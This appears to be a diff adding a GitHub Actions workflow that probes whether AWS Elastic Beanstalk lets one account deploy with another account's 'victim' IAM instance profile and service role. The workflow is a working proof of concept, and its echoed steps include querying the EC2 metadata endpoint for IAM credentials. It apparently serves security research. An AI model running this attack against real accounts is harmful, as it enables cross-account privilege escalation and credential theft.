@@ -1,0 +1,160 @@
+name: Cross-Account IAM Role Injection Test
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+permissions:
+  id-token: write  # Required for OIDC
+  contents: read
+
+jobs:
+  test-cross-account-iam:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Configure AWS Credentials (Account A - Attacker)
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          # REPLACE THIS with output from setup-attacker-oidc.sh
+          role-to-assume: arn:aws:iam::612470416133:role/github-actions-eb-test
+          aws-region: us-east-1
+
+      - name: Verify AWS Identity
+        run: |
+          echo "Authenticated as:"
+          aws sts get-caller-identity
+
+          ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
+          echo "Account ID: $ACCOUNT_ID"
+
+          if [ "$ACCOUNT_ID" != "612470416133" ]; then
+            echo "❌ Error: Expected Account A (612470416133), got $ACCOUNT_ID"
+            exit 1
+          fi
+
+          echo "✅ Authenticated as Account A (attacker)"
+
+      - name: Create deployment package
+        run: |
+          cd app
+          zip -r ../application.zip .
+          cd ..
+          ls -lh application.zip
+
+      - name: Deploy to Elastic Beanstalk with VICTIM's IAM Role
+        id: deploy
+        continue-on-error: true
+        uses: aws-actions/aws-elasticbeanstalk-deploy@v1
+        with:
+          aws-region: us-east-1
+          application-name: cross-account-iam-test
+          environment-name: test-cross-account-iam
+          version-label: test-${{ github.run_number }}
+          deployment-package-path: application.zip
+          solution-stack-name: "64bit Amazon Linux 2023 v4.3.0 running Python 3.11"
+          create-environment-if-not-exists: true
+          create-application-if-not-exists: true
+          wait-for-deployment: true
+          deployment-timeout: 900
+          # CRITICAL: Using VICTIM account's IAM roles (Account B: 142531840183)
+          option-settings: |
+            [
+              {
+                "Namespace": "aws:autoscaling:launchconfiguration",
+                "OptionName": "IamInstanceProfile",
+                "Value": "arn:aws:iam::142531840183:instance-profile/victim-powerful-role"
+              },
+              {
+                "Namespace": "aws:elasticbeanstalk:environment",
+                "OptionName": "ServiceRole",
+                "Value": "arn:aws:iam::142531840183:role/victim-eb-service-role"
+              },
+              {
+                "Namespace": "aws:autoscaling:launchconfiguration",
+                "OptionName": "InstanceType",
+                "Value": "t2.micro"
+              }
+            ]
+
+      - name: Analyze Deployment Result
+        if: always()
+        run: |
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo "SECURITY TEST RESULT"
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo ""
+
+          if [ "${{ steps.deploy.outcome }}" == "success" ]; then
+            echo "🚨 DEPLOYMENT SUCCEEDED - POTENTIAL VULNERABILITY!"
+            echo ""
+            echo "The Elastic Beanstalk environment was created using"
+            echo "IAM roles from a DIFFERENT AWS account (142531840183)."
+            echo ""
+            echo "Environment URL: ${{ steps.deploy.outputs.environment-url }}"
+            echo "Environment ID: ${{ steps.deploy.outputs.environment-id }}"
+            echo ""
+            echo "Next step: Verify EC2 instances have victim's IAM role"
+            echo ""
+            echo "To check:"
+            echo "1. SSH into EC2 instance"
+            echo "2. curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+            echo "3. If it returns 'victim-powerful-role' → CRITICAL VULNERABILITY"
+            echo ""
+            exit 0
+          else
+            echo "✅ DEPLOYMENT FAILED - Likely SECURE"
+            echo ""
+            echo "The deployment failed, which suggests AWS validated"
+            echo "that IAM roles must be in the same account."
+            echo ""
+            echo "Check error message for confirmation:"
+            echo ""
+          fi
+
+      - name: Get Environment Details (if created)
+        if: steps.deploy.outcome == 'success'
+        run: |
+          echo "Getting environment details..."
+          aws elasticbeanstalk describe-environments \
+            --application-name cross-account-iam-test \
+            --environment-names test-cross-account-iam \
+            --query 'Environments[0].[EnvironmentName, Status, Health, CNAME]' \
+            --output table
+
+      - name: Get EC2 Instance Details (if created)
+        if: steps.deploy.outcome == 'success'
+        run: |
+          echo "Getting EC2 instances..."
+
+          # Get environment ID
+          ENV_ID=$(aws elasticbeanstalk describe-environments \
+            --application-name cross-account-iam-test \
+            --environment-names test-cross-account-iam \
+            --query 'Environments[0].EnvironmentId' \
+            --output text)
+
+          echo "Environment ID: $ENV_ID"
+
+          # Find EC2 instances with this environment ID
+          aws ec2 describe-instances \
+            --filters "Name=tag:elasticbeanstalk:environment-id,Values=$ENV_ID" \
+            --query 'Reservations[].Instances[].[InstanceId, IamInstanceProfile.Arn, PublicIpAddress, State.Name]' \
+            --output table
+
+      - name: Cleanup (Optional)
+        if: always() && steps.deploy.outcome == 'success'
+        continue-on-error: true
+        run: |
+          echo "To cleanup (run manually if desired):"
+          echo ""
+          echo "aws elasticbeanstalk terminate-environment \\"
+          echo "  --environment-name test-cross-account-iam \\"
+          echo "  --region us-east-1"
+          echo ""
+          echo "Note: Environment is left running for manual verification."
+          echo "IMPORTANT: Delete it within 1 hour to avoid charges!"
